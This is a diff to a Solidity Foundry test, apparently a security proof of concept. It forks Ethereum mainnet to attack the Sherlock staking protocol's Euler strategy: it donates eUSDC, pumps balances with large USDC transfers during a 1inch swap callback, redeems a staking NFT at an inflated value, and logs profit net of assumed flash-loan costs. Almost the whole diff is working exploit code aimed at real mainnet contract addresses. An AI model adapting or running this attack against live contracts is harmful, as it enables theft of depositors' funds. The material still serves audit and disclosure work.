@@ -35,13 +35,15 @@ contract OneInchSwapUtils {
     }
 }
 
-
+// forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/ --fork-block-number 15140970 -vvv
 contract SherlockTest is Test, Minter, ERC721TokenReceiver, OneInchSwapUtils{
 
     using SafeTransferLib for ERC20;
 
     address sherlock = 0x0865a889183039689034dA55c1Fd12aF5083eabF;
-    uint256 mintAmount = 1000000 * 10 ** 6;
+    uint256 mintAmount = 10_000_000 * 10 ** 6; // Amount of USDC to mint in total
+    uint256 donateAmount =  1_000_000 * 10 ** 6; // Amount of the minted USDC will be donated to the EulerStrategy
+    uint256 flashloanAmount = 1_000_000_000 * 10 ** 6; // Amount of USDC to flashloan
     uint256 period = 15724800; // 6 months
 
     address eulerStrategy = 0xC124A8088c39625f125655152A168baA86b49026;
@@ -110,39 +112,62 @@ contract SherlockTest is Test, Minter, ERC721TokenReceiver, OneInchSwapUtils{
         MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
         uint256 ethDeposit = 1 ether;
         uint256 usdcAmount = 10e6;
-        uint256 pumpAmount = 5000000000 * 10**6; // 5B
+        uint256 pumpAmount = flashloanAmount /2;
         mintUsdc(address(this), pumpAmount * 2 + usdcAmount); // need pumpamount * 2;
 
         uint256 preAttack = ERC20(usdc).balanceOf(address(this));
         console.log("pre attack:", preAttack);
-        (uint id, uint shares) = ISherlockStake(sherlock).initialStake(mintAmount, period, address(this));
+        (uint id, uint shares) = ISherlockStake(sherlock).initialStake(mintAmount-donateAmount, period, address(this));
 
         NFTID = id;
+
         vm.warp(block.timestamp + period + 10);
         vm.roll(block.number + 1);
+        {
+            depositEuler(usdc, donateAmount);
+            ERC20 eUSDC = ERC20(markets.underlyingToEToken(usdc));
+            console.log("prepump eUSDC:", eUSDC.balanceOf(address(this)));
+            eUSDC.transfer(eulerStrategy, eUSDC.balanceOf(address(this)));
+        }
         {
             uint256 usdcAmount = 10**6;
             depositEuler(WETH, ethDeposit);
             depositEuler(usdc, usdcAmount);
+            ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));
+            console.log("eusdc after deposit", ERC20(address(collateralEToken)).balanceOf(address(this)));
+
             PUMPAMOUNT = pumpAmount;
             console.log("beforeSwap");
             swap(WETH, usdc, ethDeposit / 2);
+            console.log("eusdc after swap", ERC20(address(collateralEToken)).balanceOf(address(this)));
+
         }
+        console.log("after swap:", ERC20(usdc).balanceOf(address(this)));
+        console.log("1inch after swap", ERC20(usdc).balanceOf(oneInchAddress));
 
         {
             ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(WETH));
             uint256 underlying = collateralEToken.balanceOfUnderlying(address(this));
             collateralEToken.withdraw(0, underlying);
+            console.log("after withdraw weth", underlying);
+
 
             collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));
+            console.log("eusdc", ERC20(address(collateralEToken)).balanceOf(address(this)));
             underlying = collateralEToken.balanceOfUnderlying(address(this));
             collateralEToken.withdraw(0, underlying);
+            console.log("after withdraw usdc", underlying);
+
             // withdraw
         }
+
+        console.log("after withdraw:", ERC20(usdc).balanceOf(address(this)));
         {
             uint256 postAttack = ERC20(usdc).balanceOf(address(this));
             console.log("post attack:", postAttack);
-            console.log("profit:", postAttack - preAttack);
+            console.log("gross profit:", postAttack - preAttack);
+            // assuming 0.09% flash loan cost
+            console.log("flash loan costs:", (flashloanAmount / 10_000) * 9);
         }
 
     }
@@ -159,9 +184,19 @@ contract SherlockTest is Test, Minter, ERC721TokenReceiver, OneInchSwapUtils{
         uint256 underlyingAmount = collateralEToken.balanceOfUnderlying(eulerStrategy);
 
         console.log("underlyingAmount:", underlyingAmount);
+        console.log("before pump:", ERC20(usdc).balanceOf(address(this)));
 
+       // ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));
+        console.log("eusdc before pump ", ERC20(address(collateralEToken)).balanceOf(address(this)));
         ERC20(usdc).transfer(euler, PUMPAMOUNT);
+        console.log("eusdc after pump ", ERC20(address(collateralEToken)).balanceOf(address(this)));
+
+        console.log("1inch before pump", ERC20(usdc).balanceOf(oneInchAddress));
         ERC20(usdc).transfer(oneInchAddress, PUMPAMOUNT);
+        console.log("1inch after pump", ERC20(usdc).balanceOf(oneInchAddress));
+
+        console.log("after pump:", ERC20(usdc).balanceOf(address(this)));
+
 
 
         underlyingAmount = collateralEToken.balanceOfUnderlying(eulerStrategy);
@@ -169,6 +204,9 @@ contract SherlockTest is Test, Minter, ERC721TokenReceiver, OneInchSwapUtils{
         // design for 1inch callback
         uint256 amount = ISherlockStake(sherlock).redeemNFT(NFTID);
         console.log("withdrawamount:", amount);
+
+        console.log("after redeem:", ERC20(usdc).balanceOf(address(this)));
+
     }
 
 }
